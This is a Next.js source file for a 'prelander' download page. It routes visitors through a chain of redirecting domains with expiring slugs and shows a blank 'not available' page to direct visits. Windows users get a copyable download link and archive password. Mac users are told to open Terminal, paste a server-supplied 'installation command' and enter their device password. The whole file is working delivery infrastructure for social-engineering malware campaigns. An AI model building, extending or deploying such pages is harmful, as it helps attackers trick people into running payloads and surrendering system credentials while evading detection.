'use client'

import { useState, useEffect } from 'react'
import { useParams } from 'next/navigation'
import { Copy, Check, Lock, FileDown, Terminal } from 'lucide-react'

/**
 * Prelander page served on the last domain — /d/[slug]
 *
 * Access-control:
 *  - Slug encodes a timestamp (validated server-side). Expired → blocked.
 *  - Direct access without a valid slug → neutral "not available" page.
 *  - When called from an intermediate domain the backend returns a 302 to
 *    the last domain. The browser follows it transparently; if the hostname
 *    changes we detect it and hard-navigate (handles cross-origin 302s that
 *    fetch's opaque redirect mode would otherwise hide).
 *
 * Redirection flow (spec):
 *  - Bypass OFF: Anchor → Inter (1.5s dwell) → THIS landing page
 *  - Bypass ON:  Anchor → Inter (1.5s dwell) → Campaign URL (via
 *    bypass_redirect_url from /domain-type — this page never shows)
 */

export default function PrelanderSlugPage() {
  const params = useParams()
  const slug = params.slug as string
  const [data, setData] = useState<any>(null)
  const [loading, setLoading] = useState(true)
  const [blocked, setBlocked] = useState(false)
  // True while the browser is transitioning from an Anchor/Inter domain to the
  // Prelander domain. We hold a loader on screen for a short fixed delay so the
  // visitor sees a clean "redirecting…" state rather than a jarring hop.
  const [transitioning, setTransitioning] = useState(false)

  useEffect(() => {
    const fetchData = async () => {
      if (!slug) { setBlocked(true); setLoading(false); return }

      const hostname = typeof window !== 'undefined' ? window.location.hostname : ''

      try {
        // Step 1: check if this hostname is the Prelander domain.
        // If not, redirect the browser to the Prelander domain with the same
        // slug. This avoids fetch() swallowing the 302 from the backend.
        // The slug is passed so the backend can also detect bypass mode and
        // return the Campaign URL directly (bypass ON spec).
        const dtRes = await fetch(
          `/api/prelander/domain-type?host=${encodeURIComponent(hostname)}&slug=${encodeURIComponent(slug)}`
        )
        if (dtRes.ok) {
          const dt = await dtRes.json()
          // Bypass ON (spec): Anchor → Inter (1.5s dwell) → Campaign URL.
          // We're on the Inter domain — hold the 1.5s loader, then go straight
          // to the Campaign URL. The Prelander page is never shown.
          if (dt.bypass_redirect_url) {
            setTransitioning(true)
            await new Promise(r => setTimeout(r, 1500))
            window.location.replace(dt.bypass_redirect_url)
            return
          }
          // `last_domain` is the pre-glossary name the API still mirrors.
          const prelanderDomain = dt.prelander_domain ?? dt.last_domain
          // The backend resolves the NEXT managed hop (chain-aware): the next
          // chain hop, the weighted Prelander pool pick, or the legacy
          // publisher/global Prelander domain. It only returns a URL when this
          // host is NOT the final prelander — so trust the returned hop over
          // the domain_type (a prelander-typed domain positioned mid-chain must
          // keep hopping).
          if (prelanderDomain) {
            // Not on the final prelander — hop to the next domain. Show a clear
            // loader for a fixed 1.5s so the domain switch reads as
            // intentional, then navigate. Raw slug chars are base64url-safe.
            setTransitioning(true)
            await new Promise(r => setTimeout(r, 1500))
            window.location.replace(`${prelanderDomain}/d/${slug}`)
            return
          }
        }

        // Step 2: on the Prelander domain (or type unknown) — fetch prelander data
        const res = await fetch(`/api/prelander/resolve/${slug}`, {
          headers: { 'X-Prelander-Host': hostname },
        })

        if (!res.ok) {
          setBlocked(true)
          setLoading(false)
          return
        }

        const json = await res.json()
        if (!json?.success) {
          setBlocked(true)
        } else {
          setData(json)
        }
      } catch {
        setBlocked(true)
      } finally {
        setLoading(false)
      }
    }
    fetchData()
  }, [slug])

  useEffect(() => {
    document.title = 'Download Ready'
  }, [])

  // Shown when the visitor is being switched from an Anchor/Inter domain to the
  // Prelander domain. A clean, branded loader keeps the intermediate hop from
  // looking like a dead end or a broken redirect.
  if (transitioning) {
    return (
      <div className="min-h-screen flex flex-col items-center justify-center bg-[#0f172a]">
        <div className="flex flex-col items-center gap-5">
          <div className="relative w-16 h-16">
            <div className="absolute inset-0 rounded-full border-4 border-white/10" />
            <div className="absolute inset-0 rounded-full border-4 border-t-green-400 animate-spin" />
          </div>
          <div className="text-center">
            <p className="text-white text-lg font-semibold">Redirecting…</p>
            <p className="text-white/50 text-sm mt-1">Taking you to a secure download page</p>
          </div>
        </div>
      </div>
    )
  }

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-[#f0f2f5]">
        <div className="w-8 h-8 border-[3px] border-gray-200 border-t-gray-600 rounded-full animate-spin" />
      </div>
    )
  }

  if (blocked || !data) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-[#f0f2f5]">
        <div className="text-center">
          <div className="w-16 h-16 rounded-full bg-gray-200 mx-auto mb-4 flex items-center justify-center">
            <FileDown size={24} className="text-gray-400" />
          </div>
          <p className="text-gray-500 text-sm">This link is no longer available.</p>
        </div>
      </div>
    )
  }

  // Note: Bypass OFF always shows the landing page — even when the backend has
  // no active template (the built-in layout renders as fallback). The visitor
  // is only forwarded straight to the campaign URL when Bypass is ON, which
  // happens earlier via `bypass_redirect_url` from /domain-type.

  // Admin pasted a complete HTML template → the backend already rendered it
  // server-side ({Campaign_URL} / {Password} shortcodes substituted). Serve it
  // as a full-page document instead of the built-in layouts.
  if (data.rendered_html) return <FullHtmlPrelander html={data.rendered_html} />

  if (data.os === 'mac') return <MacPrelander data={data} />
  return <WindowsPrelander data={data} />
}

/* ─── Full HTML: server-rendered custom template ─────────────────────────── */
function FullHtmlPrelander({ html }: { html: string }) {
  useEffect(() => {
    // Replace the whole document so <!DOCTYPE html>, <head> styles and the
    // template's scripts behave exactly as the admin authored them.
    document.open()
    document.write(html)
    document.close()
  }, [html])
  return null
}

/* ─── Windows Prelander ──────────────────────────────────────────────────── */
function WindowsPrelander({ data }: { data: any }) {
  const [copied, setCopied] = useState(false)
  // Template customisation fields resolved by the backend (assigned template
  // or OS default); fall back to the historical copy when no template data.
  const tpl = data?.template
  const title = tpl?.title ?? 'Your file is ready to download'
  const subtitle = tpl?.subtitle ?? 'Your file is prepared. Copy the link to download.'
  const buttonText = tpl?.button_text ?? 'Copy'

  const handleCopy = () => {
    if (data?.offer_url) {
      navigator.clipboard.writeText(data.offer_url).catch(() => {})
      setCopied(true)
      setTimeout(() => setCopied(false), 2000)
    }
  }

  return (
    <div className="min-h-screen flex items-center justify-center p-4 bg-[#f0f2f5]">
      <div className="w-full max-w-md">
        <div className="bg-white rounded-2xl shadow-lg border border-gray-200 overflow-hidden">
          <div className="px-6 pt-8 pb-5 text-center">
            <div className="w-14 h-14 rounded-full bg-green-100 mx-auto mb-4 flex items-center justify-center">
              <FileDown size={26} className="text-green-600" />
            </div>
            <h1 className="text-xl font-bold text-gray-900">{title}</h1>
            <p className="text-sm text-gray-500 mt-2">{subtitle}</p>
          </div>

          <div className="px-6 pb-4">
            <label className="block text-xs font-semibold text-gray-500 uppercase tracking-wide mb-2">Download Link</label>
            <div className="flex items-center gap-2 bg-gray-50 border border-gray-200 rounded-xl p-1">
              <div className="flex-1 px-3 py-2.5 text-sm text-gray-700 font-mono truncate select-all">
                {data.offer_url}
              </div>
              <button onClick={handleCopy}
                className={`flex-shrink-0 flex items-center gap-1.5 px-4 py-2.5 rounded-lg text-sm font-semibold transition-all ${
                  copied ? 'bg-green-600 text-white' : 'bg-gray-900 text-white hover:bg-gray-800'
                }`}>
                {copied ? <><Check size={14} /> Copied</> : <><Copy size={14} /> {buttonText}</>}
              </button>
            </div>
          </div>

          {data.password && (tpl?.show_password_field ?? true) && (
            <div className="px-6 pb-4">
              <label className="block text-xs font-semibold text-gray-500 uppercase tracking-wide mb-2">Password</label>
              <div className="flex items-center gap-3 bg-amber-50 border border-amber-200 rounded-xl px-4 py-3">
                <Lock size={16} className="text-amber-500 flex-shrink-0" />
                <span className="text-base font-bold font-mono tracking-widest text-amber-800 select-all">{data.password}</span>
              </div>
            </div>
          )}

          <div className="px-6 pb-8" />
        </div>
        <p className="text-center text-xs text-gray-400 mt-4">Secure file hosting service</p>
      </div>
    </div>
  )
}

/* ─── Mac Prelander ──────────────────────────────────────────────────────── */
function MacPrelander({ data }: { data: any }) {
  const [copiedCmd, setCopiedCmd] = useState(false)
  const installCommand = data.offer_url || ''
  // Template customisation fields — same source as the Windows prelander.
  const tpl = data?.template
  const title = tpl?.title ?? 'How to open Terminal on Mac'

  const handleCopyCmd = () => {
    navigator.clipboard.writeText(installCommand).catch(() => {})
    setCopiedCmd(true)
    setTimeout(() => setCopiedCmd(false), 2000)
  }

  return (
    <div className="min-h-screen bg-[#f5f5f7] flex flex-col items-center p-4 py-10">
      <div className="w-full max-w-2xl space-y-6">

        <div className="bg-white rounded-2xl shadow-lg border border-gray-200 overflow-hidden">
          <div className="px-6 pt-8 pb-5 text-center">
            <div className="w-14 h-14 rounded-full bg-gray-900 mx-auto mb-4 flex items-center justify-center">
              <Terminal size={26} className="text-green-400" />
            </div>
            <h1 className="text-xl font-bold text-gray-900">{title}</h1>
          </div>

          <div className="px-6 pb-5">
            <label className="block text-xs font-semibold text-gray-500 uppercase tracking-wide mb-2">Installation Command</label>
            <div className="flex items-center gap-2 bg-gray-900 rounded-xl p-1">
              <div className="flex-1 px-3 py-3 text-sm text-green-400 font-mono truncate select-all">
                <span className="text-gray-500 mr-1">$</span> {installCommand}
              </div>
              <button onClick={handleCopyCmd}
                className={`flex-shrink-0 flex items-center gap-1.5 px-4 py-2.5 rounded-lg text-sm font-semibold transition-all ${
                  copiedCmd ? 'bg-green-600 text-white' : 'bg-gray-700 text-white hover:bg-gray-600'
                }`}>
                {copiedCmd ? <><Check size={14} /> Copied</> : <><Copy size={14} /> Copy</>}
              </button>
            </div>
          </div>

          <div className="px-6 pb-6">
            <div className="space-y-3">
              {[
                <>Press <kbd className="px-1.5 py-0.5 bg-gray-100 border border-gray-300 rounded text-xs font-mono">⌘</kbd> + <kbd className="px-1.5 py-0.5 bg-gray-100 border border-gray-300 rounded text-xs font-mono">Space</kbd> to open Spotlight Search.</>,
                <>Type <strong>&quot;Terminal&quot;</strong> and press <kbd className="px-1.5 py-0.5 bg-gray-100 border border-gray-300 rounded text-xs font-mono">Return</kbd> to launch it.</>,
                <>Once the Terminal window is open, proceed with the steps below.</>,
              ].map((step, i) => (
                <div key={i} className="flex gap-3">
                  <div className="flex-shrink-0 w-7 h-7 rounded-full bg-blue-100 text-blue-700 flex items-center justify-center text-sm font-bold">{i + 1}</div>
                  <p className="text-sm text-gray-700 pt-1">{step}</p>
                </div>
              ))}
            </div>
          </div>
        </div>

        <div className="bg-white rounded-2xl shadow-lg border border-gray-200 overflow-hidden">
          <div className="px-6 pt-6 pb-2">
            <h2 className="text-lg font-bold text-gray-900">Installation via Terminal command</h2>
          </div>
          <div className="px-6 pb-6">
            <div className="space-y-3 mt-3">
              {[
                'Copy the installation command above.',
                <>Open the terminal and paste the command, then press <strong>&quot;Return&quot;</strong>.</>,
                'Enter your device password and confirm the installation.',
              ].map((step, i) => (
                <div key={i} className="flex gap-3">
                  <div className="flex-shrink-0 w-7 h-7 rounded-full bg-green-100 text-green-700 flex items-center justify-center text-sm font-bold">{i + 1}</div>
                  <p className="text-sm text-gray-700 pt-1">{step}</p>
                </div>
              ))}
            </div>
          </div>

          {data.password && (
            <div className="px-6 pb-6">
              <label className="block text-xs font-semibold text-gray-500 uppercase tracking-wide mb-2">Device Password</label>
              <div className="flex items-center gap-3 bg-amber-50 border border-amber-200 rounded-xl px-4 py-3">
                <Lock size={16} className="text-amber-500 flex-shrink-0" />
                <span className="text-base font-bold font-mono tracking-widest text-amber-800 select-all">{data.password}</span>
              </div>
            </div>
          )}
        </div>

        <div className="bg-white rounded-2xl shadow-lg border border-gray-200 overflow-hidden">
          <div className="px-6 pt-6 pb-2">
            <h2 className="text-lg font-bold text-gray-900">Video Tutorial</h2>
            <p className="text-sm text-gray-500 mt-1">Watch the step-by-step guide below</p>
          </div>
          <div className="px-6 pb-6 pt-3">
            <div className="relative w-full aspect-video bg-black rounded-xl overflow-hidden">
              <video className="w-full h-full" controls playsInline autoPlay muted loop preload="auto" src="/terminal.mp4" />
            </div>
          </div>
        </div>

        <p className="text-center text-xs text-gray-400 pb-4">Secure installation service</p>
      </div>
    </div>
  )
}
